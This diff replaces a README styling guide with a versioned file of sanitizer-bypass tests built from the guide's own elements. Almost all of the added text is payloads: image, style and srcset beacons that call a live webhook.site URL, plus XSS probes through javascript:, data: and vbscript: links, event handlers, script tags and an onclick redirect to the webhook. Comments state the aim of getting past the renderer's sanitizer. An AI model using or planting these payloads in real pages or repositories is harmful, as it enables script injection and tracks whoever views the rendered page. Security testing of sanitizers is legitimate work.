@@ -1,407 +1,325 @@
+# v43: Ruby/Details/Diff/KBD Security Tests
 
-
-
-<h2 align="center">Guide on how to style your readme different from anyone else</h2>
-
-<b>Bold</b>
-
-<i>Italic</i>
-
-<s>Strikethrough</s>
-
-<strong>Strong</strong>
-
-<em>Emphasis</em>
-
-<del>Deleted</del>
-
-<ins>Inserted</ins>
-
-<mark>Highlighted</mark>
-
-<sup>Superscript</sup>
-
-<sub>Subscript</sub>
-
-<code>Code</code>
-
-<pre>Preformatted</pre>
-
-<kbd>Keyboard</kbd>
-
-<samp>Sample output</samp>
-
-<table><tr><td>Boxed text</td></tr></table>
-
-<ul><li>Unordered list</li></ul>
-<ol><li>Ordered list</li></ol>
-<dl><dt>Term</dt><dd>Definition</dd></dl>
-
-
-<details>
-<summary>title of the content</summary>
-
-content body
-
-```json
-{
-  support: "codeblock to"
-}
-```
-</details>
-
-> **Sir Charles Antony Richard Hoare**
->> *"Long quote text here..."*
-
-
-<table>
-  <tr>
-    <td align="center"><b>example</b></td>
-    <td><img src="zebbernpanda.png" width="50"></td>
-  </tr>
-</table>
-
-
-<ruby>v2.1.0<rt>🚀 Latest Release</rt></ruby>
-<ruby>Beta<rt>⚠️ Testing Phase</rt></ruby>
-<ruby>Stable<rt>✅ Production Ready</rt></ruby>
-
-<ruby>@username<rt>👨‍💻 Lead Developer</rt></ruby>
-<ruby>@designer<rt>🎨 UI/UX Designer</rt></ruby>
-
-<ruby>MIT<rt>📄 Open Source License</rt></ruby>
-<ruby>GPL<rt>🔒 Copyleft License</rt></ruby>
-
-<ruby>API<rt>Application Programming Interface</rt></ruby>
-<ruby>REST<rt>Representational State Transfer</rt></ruby>
-<ruby>JWT<rt>JSON Web Token</rt></ruby>
-<ruby>CRUD<rt>Create Read Update Delete</rt></ruby>
-
-<ruby>漢<rt>かん</rt></ruby>
-
-<hr>
-
-<kbd>
-<h1><code>H1</code></h1>
-</kbd>
-<kbd>
-<h2><code>H2</code></h2>
-</kbd>
-<kbd>
-<h3><code>H3</code></h3>
-</kbd>
-<kbd>
-<h4><code>H4</code></h4>
-</kbd>
-<kbd>
-<h5><code>H5</code></h5>
-</kbd>
-<kbd>
-<h6><code>H6</code></h6>
-</kbd>
-<kbd>
-<code>Default</code>
-</kbd>
-
-</kbd>
-
-
-
-```diff
-- test
-+ test
-!test
-@@ test @@
-===================================================================
-***************
-*** 1,3 ****
---- 1,3 ----
-diff --test
-```
-### We Can Also choose to put them beside eachother
-<kbd>
-<h1><code>H1</code></h1>
-</kbd>
-<kbd>
-<h2><code>H2</code></h2>
-</kbd>
-<kbd>
-<h3><code>H3</code></h3>
-</kbd>
-<kbd>
-<h4><code>H4</code></h4>
-</kbd>
-<kbd>
-<h5><code>H5</code></h5>
-</kbd>
-<kbd>
-<h6><code>H6</code></h6>
-</kbd>
-<kbd>
-<code>Default</code>
-</kbd>
-
-</kbd>
-
-<kbd>
-  
-```diff
-- test
-+ test
-!test
-@@ test @@
-===================================================================
-***************
-*** 1,3 ****
---- 1,3 ----
-diff --test
-```
-</kbd>
-
-### You dont need to wrap it in `kbd` either this is without
-
-
-<h1><code>H1</code></h1>
-
-<h2><code>H2</code></h2>
-
-<h3><code>H3</code></h3>
-
-<h4><code>H4</code></h4>
-
-<h5><code>H5</code></h5>
-
-<h6><code>H6</code></h6>
-
-<code>Default</code>
-  
-```diff
-- test
-+ test
-!test
-@@ test @@
-===================================================================
-***************
-*** 1,3 ****
---- 1,3 ----
-diff --test
-```
-
-### Ever thought about putting pictures next to a text? well you can!
-
-<div align="left">
-
-  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
-
-<kbd>
-
-<h1>Style to left</h1>
-
-<kbd>🔹<strong>Make some text</strong></kbd> 
-
-🔹<strong>Make some text</strong>
-
-🔹Make some text
-
-</div>
-
-
-<div align="center">
-
-<kbd>
-
-<h1>Style to center</h1>
-
-</kbd>
-
-  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
-
-<kbd>
-
-<h1>Style to center</h1>
-
-<kbd>🔹<strong>Make some text</strong></kbd> 
-
-🔹<strong>Make some text</strong>
-
-🔹Make some text
-
-</div>
-
-<div align="center">
-
-<div align="right">
-
-  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
-
-<kbd>
-
-<h1>Style to right</h1>
-
-<kbd>🔹<strong>Make some text</strong></kbd> 
-
-🔹<strong>Make some text</strong>
-
-🔹Make some text
-
-</div>
-
-<kbd>
-
-<h1>Another way you can style</h1>
-
-<kbd>🔹<strong>Make some text</strong></kbd> 
-
-🔹<strong>Make some text</strong>
-
-🔹Make some text
-
-  <img width="16%" align="center" src="zebbernpanda.png" alt="zebbernpanda">
-
-
-</div>
-
-### Clean Start Look
-
-<div align="center">
-   
-   <a href="https://github.com/zebbern/">
-      <img src="zebbernpanda.png" width="13%">
-   </a>
-
-![Python](https://img.shields.io/badge/Python-3.x-blue)
-![Status](https://img.shields.io/badge/Status-Active-green)
-![License](https://img.shields.io/badge/License-MIT-brightgreen)
-
-**Put a short bio or whatever you want here about your project something short but catchy explaining your project**
+> Inspired by your styling guide - testing those fancy elements!
 
 ---
 
+## 1. Ruby Annotation Payloads
+
+<!-- Can we hide callbacks in ruby annotations? -->
+
+<ruby>Text<rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rt-img.gif"></rt></ruby>
+
+<ruby><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-base-img.gif"><rt>annotation</rt></ruby>
+
+<ruby>Status<rt><a href="javascript:alert(1)">XSS</a></rt></ruby>
+
+<ruby onmouseover="alert(1)">Hover<rt>test</rt></ruby>
+
+<ruby><img src=x onerror=alert(1)><rt>error</rt></ruby>
+
+<ruby>Test<rt style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-style.gif)">styled</rt></ruby>
+
+<ruby><rp>(<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-rp.gif"></rp><rt>test</rt><rp>)</rp></ruby>
+
+<ruby>Multi<rt><rt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ruby-double-rt.gif"></rt></rt></ruby>
+
+---
+
+## 2. Details/Summary Payloads
+
+<!-- Collapsible content might bypass sanitizer -->
+
+<details>
+<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/summary-img.gif"></summary>
+Hidden content
+</details>
+
+<details open>
+<summary>Auto-Open</summary>
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-open.gif">
+</details>
+
+<details>
+<summary onclick="alert(1)">Click Handler</summary>
+Content
+</details>
+
+<details>
+<summary><script>alert(1)</script></summary>
+Script in summary
+</details>
+
+<details>
+<summary>Nested Details</summary>
+<details>
+<summary><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-details.gif"></summary>
+Deep nested
+</details>
+</details>
+
+<details style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-style.gif)">
+<summary>Styled details</summary>
+Content
+</details>
+
+<details data-x="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/details-data.gif>">
+<summary>Data attr</summary>
+Content
+</details>
+
+---
+
+## 3. KBD Deep Nesting Payloads
+
+<!-- From your guide - deep nesting might confuse parser -->
+
+<kbd>
+<h1><code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-h1-code.gif"></code></h1>
+</kbd>
+
+<kbd>
+<kbd>
+<kbd>
+<kbd>
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-nested-4.gif">
+</kbd>
+</kbd>
+</kbd>
+</kbd>
+
+<kbd><script>alert(1)</script></kbd>
+
+<kbd onkeydown="alert(1)">Press me</kbd>
+
+<kbd style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-style.gif)">styled</kbd>
+
+<kbd>
+<pre>
+<code>
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-pre-code.gif">
+</code>
+</pre>
+</kbd>
+
+<kbd><samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/kbd-samp.gif"></samp></kbd>
+
+---
+
+## 4. Diff Code Block Injection
+
+<!-- Can we inject through diff syntax? -->
+
+```diff
+- <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-minus.gif">
++ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-plus.gif">
+! <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-bang.gif">
+@@ <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/diff-at.gif"> @@
+```
+
+```diff
+- <script>alert(1)</script>
++ <script>alert(2)</script>
+```
+
+```diff
+- javascript:alert(1)
+```
+
+```html
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-html.gif">
+```
+
+```javascript
+document.write('<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/codeblock-js.gif">')
+```
+
+---
+
+## 5. Align Attribute Chains
+
+<!-- Nested div align might have quirks -->
+
+<div align="left">
 <div align="center">
-
-<h3 align="center">Features ⁀➴ </h3>
-
-<kbd>
-<h3>
- 
-Feature 1 test test test test test test test test test test
-
-</h3>
-</kbd>
-<br>
-<kbd>
-<h3>
- 
-Feature 2 test test test test test test test test
-
-</h3>
-</kbd>
-<br>
-<kbd>
-<h3>
- 
-<code>Feature 3 test test test test test test</code>
-
-</h3>
-</kbd>
-<br>
-<kbd>
-<h4>
- 
-Supports status code filtering
-
-</h4>
-</kbd>
-
-</kbd>
-<br>│
-<br>│
-<br>🢃<br>
-<kbd>
-
-<h3 align="left">
- 
-<kbd>$ </kbd> [HeaderRefer1](#HeaderRefer1) 
-
-<kbd>$ </kbd> [HeaderRefer2](#HeaderRefer2) We can also add context
-
-<kbd>$ </kbd> [HeaderRefer3](#HeaderRefer3) <kbd>or wrap it up</kbd>
-
-</h3>
-</kbd>
-
-<h4 id="HeaderRefer1">HeaderRefer1</h4>
-<h4 id="HeaderRefer2">HeaderRefer2</h4>
-<h4 id="HeaderRefer3">HeaderRefer3</h4>
-  
-<div align="center">
-
-<h1 align="center">🢇⁀🐧 ˗˗˗ˏˋ🖳ˎˊ˗˗˗ 🪟⁀🡾</h1>
-
-<kbd>
-
-<h1 id="linux">Linux/macOS</h1>
-
-### Run these commands:
-<kbd>
-<h3>
-
-```
-git clone https://github.com/zebbern/dezcrwl.git
-cd example
-chmod +x example.sh
-./example.sh
-```
-</h3>
-</kbd>
-
-</kbd>
-
-<kbd>
- 
-<h1 id="windows">Windows</h1>
-
-### Run these commands:
-<kbd>
-<h3>
-
-```
-git clone https://github.com/zebbern/dezcrwl.git
-cd example
-example.sh
-
-```
-</h3>
-</kbd>
-
-</kbd>
-
-### Now run `example -h` anywhere in terminal
-
+<div align="right">
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/triple-align.gif">
 </div>
 </div>
 </div>
 
-<br>
-<br>
+<div align="left" onclick="alert(1)">
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/align-onclick.gif">
+</div>
 
-### You can also use these to get a users attention:
+<div align="javascript:alert(1)">
+Bad align value
+</div>
+
+<p align="center"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/p-align.gif"></p>
+
+<center><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/center-tag.gif"></center>
+
+---
+
+## 6. Anchor + Image Combos
+
+<!-- Links wrapping images -->
+
+<a href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-href-click">
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-img.gif">
+</a>
+
+<a href="javascript:alert(1)"><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-js-img.gif"></a>
+
+<a href="data:text/html,<script>alert(1)</script>"><img src="x"></a>
+
+<a href="vbscript:alert(1)"><img src="x"></a>
+
+<a href="//webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-proto-relative">Click</a>
+
+<a href="https://github.com" onclick="location='https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/a-onclick'">Hijack</a>
+
+<a href="#" onfocus="alert(1)" autofocus>Focus XSS</a>
+
+---
+
+## 7. SAMP/VAR/CODE Payloads
+
+<!-- From your guide's formatting tags -->
+
+<samp><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/samp-img.gif"></samp>
+
+<var><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/var-img.gif"></var>
+
+<code><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/code-img.gif"></code>
+
+<tt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/tt-img.gif"></tt>
+
+<pre><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/pre-img.gif"></pre>
+
+<output><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/output-img.gif"></output>
+
+---
+
+## 8. List Element Payloads
+
+<ul>
+<li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/li-img.gif"></li>
+</ul>
+
+<ol>
+<li value="javascript:alert(1)">Bad value</li>
+</ol>
+
+<dl>
+<dt><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dt-img.gif"></dt>
+<dd><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dd-img.gif"></dd>
+</dl>
+
+<menu><li><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/menu-li.gif"></li></menu>
+
+---
+
+## 9. Text Formatting + Callbacks
+
+<b><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/b-img.gif"></b>
+
+<i><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/i-img.gif"></i>
+
+<strong><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/strong-img.gif"></strong>
+
+<em><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/em-img.gif"></em>
+
+<mark><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/mark-img.gif"></mark>
+
+<del><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/del-img.gif"></del>
+
+<ins><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/ins-img.gif"></ins>
+
+<s><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/s-img.gif"></s>
+
+<u><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/u-img.gif"></u>
+
+<small><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/small-img.gif"></small>
+
+<big><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/big-img.gif"></big>
+
+<sub><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sub-img.gif"></sub>
+
+<sup><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/sup-img.gif"></sup>
+
+---
+
+## 10. Blockquote + Alert Payloads
+
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/quote-img.gif">
+
+>> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/nested-quote-img.gif">
 
 > [!NOTE]
-> Useful information that users should know, even when skimming content.
-
-> [!TIP]
-> Helpful advice for doing things better or more easily.
-
-> [!IMPORTANT]  
-> Key information users need to know to achieve their goal.
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-note-img.gif">
 
 > [!WARNING]
-> Urgent info that needs immediate user attention to avoid problems.
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-warn-img.gif">
 
 > [!CAUTION]
-> Advises about risks or negative outcomes of certain actions.
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-caution-img.gif">
 
+> [!TIP]
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-tip-img.gif">
 
+> [!IMPORTANT]
+> <img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/alert-important-img.gif">
 
+---
 
+## 11. HR/BR Edge Cases
+
+<hr style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/hr-style.gif)">
+
+<hr onclick="alert(1)">
+
+<br clear="all" style="background:url(https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/br-style.gif)">
+
+---
+
+## 12. Figure/Figcaption
+
+<figure>
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figure-img.gif">
+<figcaption><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/figcaption-img.gif"></figcaption>
+</figure>
+
+---
+
+## 13. Picture/Source Elements
+
+<picture>
+<source srcset="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/source-srcset.gif">
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/picture-img.gif">
+</picture>
+
+---
+
+## 14. Map/Area Elements
+
+<img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/map-img.gif" usemap="#testmap">
+<map name="testmap">
+<area shape="rect" coords="0,0,100,100" href="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/area-click">
+<area shape="rect" coords="0,0,100,100" href="javascript:alert(1)">
+</map>
+
+---
+
+## 15. Abbreviation/DFN
+
+<abbr title="<img src=https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/abbr-title.gif>">XSS</abbr>
+
+<dfn><img src="https://webhook.site/2c89beb6-1ea8-4fb1-a8ba-debeaaba68b1/dfn-img.gif"></dfn>
+
+<acronym title="<img src=x onerror=alert(1)>">ABC</acronym>
+
+---
+
+**v43 - Testing styling guide elements for security bypasses**
